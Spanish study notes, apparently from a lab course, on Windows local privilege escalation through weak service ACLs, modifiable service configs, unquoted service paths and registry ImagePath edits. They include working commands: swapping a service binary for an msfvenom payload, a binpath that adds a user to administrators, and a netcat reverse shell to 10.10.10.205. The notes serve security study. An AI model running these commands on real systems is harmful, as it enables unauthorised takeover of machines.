## ACLs permisivas del sistema de archivos

#### Ejecutando SharpUP

[SharpUp](https://github.com/GhostPack/SharpUp/): busca binarios de servicios que sufran de ACLs debiles

```
.\SharpUp.exe audit
```
![[Pasted image 20260911154243.png]]

	La herramienta identifico el serivicio PC Security Management Service, que ejecuta el binario SecurityService.exe


[icacls](https://ss64.com/nt/icacls.html): verificamos la vulnerabilidad y vemos que los grupos EVERYONE Y BULTIN\Users se les ha concedido permisos completo para el directorio y por lo tanto cualquier usuario puede manipular el directorio y su contenido

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
![[Pasted image 20260911154434.png]]

Reemplazamos el binario del serivicio. Primero hacemos una copia de seguridad y luego lo cambiamos por un binario creado con msfvenom. Si lo ejecuta un usuario con privs altos obtendremos una shell inversa con privs elevados

```
cmd /c copy /Y SecurityService.exe "C:\Program Files(x86)\PCProtect\SecurityService.exe"
sc start SecurityService o Start-Service SecurityService
```
![[Pasted image 20260911154644.png]]



## Permisos de servicio debiles

Volvemos a revisar la salida de SharpUp en busca de servicios modificables y vemos `WindscribeService`

```
SharpUp.exe audit
```
![[Pasted image 20260911154737.png]]

Comprobamos los permisos con [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) el cual enumera permisos del serivcio (-q: omitir banner, -u: suprimir errores, -v: verbose, -c: especificar el nombre de un servicio Windows, -w: mostrar solo los objetos que tienen acceso de escritura). Vemos como todos los AUTHENTICATED USERS tienen SERVICE_ALL_ACCESS

```
accesschk.exe /accepteula -quvcw WindscribeService
```
![[Pasted image 20260911154949.png]]

Comprobamos el grupo de administradores para confirmar que nosotros no estamos:

```
net localgroup administrators
```
![[Pasted image 20260911155019.png]]

Cambiamos la ruta del binario del servicio haciendo que la ruta sea un comando de una linea que nos añada en el grupo administrators:

```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
![[Pasted image 20260911155117.png]]

Detenemos el servicio:

```
sc stop WindscribeService
```
![[Pasted image 20260911155146.png]]

Iniciamos el servicio:

```
sc start WindscribeService
```
![[Pasted image 20260911155205.png]]

Confirmamos que fuimos añadidos:

```
net localgroup administrators
```
![[Pasted image 20260911155230.png]]

## Rutas de servicio sin comillas

Cuando se instala un servicio se especifica una ruta del binario ejecutable de ese servicio. Si este no tiene comillas se buscara en el siguente orden:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

1. Consultando el serivicio

```
sc qc SystemExplorerHelpService
```
![[Pasted image 20260911155803.png]]

Si pudieramos crear los archivos `C:\Program.exe` y `C:\Program Files (x86)\System.exe` podriamos secuestrar el binario y obtener ejecucion de comandos en contexto del servicio pero crear archivos en C:\ requiere de privs administrativos

2. Buscando rutas de servicios sin comillas

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
![[Pasted image 20260911160051.png]]


## ACLs permisivas del registro

1. Buscando ACLs de servicio debiles en el registro:

```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
![[Pasted image 20260911160200.png]]

2. Cambiando el ImagePath por Powershell:

```
C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
